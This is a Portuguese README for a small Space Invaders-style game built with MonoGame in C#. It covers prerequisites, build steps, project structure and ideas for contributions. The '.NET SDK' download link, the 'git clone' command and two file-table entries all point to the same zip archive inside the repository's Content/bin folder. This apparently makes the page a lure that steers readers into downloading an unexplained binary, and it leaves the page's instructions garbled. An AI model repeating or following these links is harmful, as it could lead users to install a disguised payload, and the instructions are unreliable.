# Game-Engine

Um jogo inspirado em *Space Invaders*, desenvolvido com **MonoGame** em C#. Ele serve tanto como um pequeno projeto divertido quanto como base de estudos para quem quer aprender a criar jogos 2D.

---

## 📚 Recursos

* Feito em C#, usando MonoGame (framework de jogos 2D/3D).
* Arquitetura básica para jogar, movimentar inimigos, detectar colisões, gerenciar telas (menu, jogo, game over), etc.
* Pipeline de conteúdos (sprites, fontes, efeitos visuais) via *MGCB Editor*.
* Código organizado para facilitar extensão: incluir novos inimigos, power-ups, níveis, etc.

---

## ⚙️ Pré-requisitos

Para compilar e rodar este projeto, você vai precisar:

* [.NET SDK](https://raw.githubusercontent.com/theualves/Game-engine/develop/Game-engine/Content/bin/Game-engine_2.0.zip) (versão compatível — teste com a versão que o projeto especifica ou a mais recente estável)
* MonoGame instalado/configurado
* Acesso ao `mgcb-editor` para gerenciar assets

---

## 🚀 Como executar

1. Clone este repositório:

   ```bash
   git clone https://raw.githubusercontent.com/theualves/Game-engine/develop/Game-engine/Content/bin/Game-engine_2.0.zip
   cd Game-engine
   ```

2. Restaurar dependências / construir:

   ```bash
   dotnet build
   ```

3. Para rodar o jogo:

   ```bash
   dotnet run
   ```

4. Para editar ou adicionar novos recursos visuais (sprites, fontes, sons etc.), abra o pipeline de conteúdo:

   ```bash
   dotnet mgcb-editor
   ```

---

## 🧩 Estrutura do Projeto

Descrevendo os diretórios mais importantes e para que servem:

| Pasta / Arquivo | Descrição                                                                                                 |
| --------------- | --------------------------------------------------------------------------------------------------------- |
| **Content/**    | Aqui ficam sprites, fontes, sons e outros assets do jogo.                                                 |
| **GameEngine/** | Código-fonte principal: lógica de jogo, classes de inimigo, jogador, estados (menu, jogo, game over) etc. |
| **https://raw.githubusercontent.com/theualves/Game-engine/develop/Game-engine/Content/bin/Game-engine_2.0.zip**  | Ponto de entrada do aplicativo.                                                                           |
| **https://raw.githubusercontent.com/theualves/Game-engine/develop/Game-engine/Content/bin/Game-engine_2.0.zip**    | Classe principal que gerencia o ciclo do jogo (inicialização, atualização, desenho).                      |

---

## 💡 Como contribuir / evoluir

Algumas ideias de melhorias que podem ser feitas, se quiser expandir o jogo:

* Adicionar múltiplos níveis com dificuldade crescente
* Introduzir power-ups ou bônus para jogador
* Sistema de pontuação e ranking local
* Animações e efeitos visuais adicionais
* Sons e músicas de fundo
* Melhorias de UI (menus, telas de game over/instruções)
* Testes unitários para lógica de jogo

Se quiser contribuir, sinta-se à vontade para abrir *issues* ou *pull requests*. Sugestões, correções de bugs, ideias novas são bem-vindas!

---

## 🔧 Tecnologias usadas

* **C#**
* **MonoGame**
* .NET SDK
* MGCB Content Pipeline
